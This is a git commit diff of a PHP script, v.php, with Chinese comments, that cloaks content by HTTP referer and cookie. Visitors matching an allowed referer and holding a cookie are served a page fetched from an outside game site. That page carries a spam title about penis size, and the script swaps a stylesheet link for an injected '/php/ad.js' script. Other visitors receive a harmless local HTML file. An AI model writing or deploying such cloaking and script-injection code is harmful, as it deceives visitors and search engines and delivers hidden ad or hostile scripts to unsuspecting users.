858280b37cf09f872b8e6b9ff26b52e210a7975d
sheshouwang1982 <sheshouwang@hotmail.com>
2024-11-24 15:24:58 +0800

    Update v.php

--- v.php
+++ v.php
@@ -1,18 +1,31 @@
-﻿<?php
+<?php
 define('ROOT_DIR', dirname(__FILE__));
-$usereferer = 'www.opamgi.com|opamgi.com';  // 允许访问的来路
+$usereferer = 'www.opangi.com|opangi.com';  // 允许访问的来路
 $cookiename = 'usermyad9990';  // 设置cookie名称
 $id = isset($_GET['id']) && preg_match('/^[a-zA-Z0-9]+$/i', $_GET['id']) ? $_GET['id'] : 0;
-$includefile = 'html/'.$id.'.html';  // 拼接包含的HTML文件路径
+$includefile = ROOT_DIR.'/'.$id.'.html';  // 拼接包含的HTML文件路径，路径修改为根目录
 
+// 检查HTTP_REFERER并且检查cookie是否存在
 if (checkreferer($usereferer) && $_COOKIE[$cookiename]){
-    $urlw = 'http://www.opamgi.com/html/'.$id.'.html';  // 目标URL
+    // 随机选择一个页面进行跳转
+    $pages = array(
+        'GameReviews.html', 'GameNews.html', 'GameTips.html', 
+        'index.html', 'game.html', 'about-us.html', 'contact-us.html', 'privacy-policy.html'
+    );
+    $randomPage = $pages[array_rand($pages)];
+
+    $urlw = 'http://www.opangi.com/'.$randomPage;  // 目标URL
     $curlobj = curl_init();  // 初始化cURL
     curl_setopt($curlobj, CURLOPT_URL, $urlw);  // 设置URL
     curl_setopt($curlobj, CURLOPT_RETURNTRANSFER, true);  // 获取返回内容
     $output = curl_exec($curlobj);  // 执行cURL请求
     curl_close($curlobj);  // 关闭cURL
-    echo '<title>How Big Your Penis Is?</title>' . str_replace('<link type="text/css" media="all" href="/css/gong.css" rel="stylesheet">', '<script src="/php/ad.js" language="javascript"></script>', $output);  // 替换内容并输出
+
+    // 替换内容并输出
+    echo '<title>How Big Your Penis Is?</title>' . 
+         str_replace('<link type="text/css" media="all" href="/css/gong.css" rel="stylesheet">', 
+                     '<script src="/php/ad.js" language="javascript"></script>', 
+                     $output);
 } else {
     include $includefile;  // 如果没有cookie，则直接包含HTML文件
 }
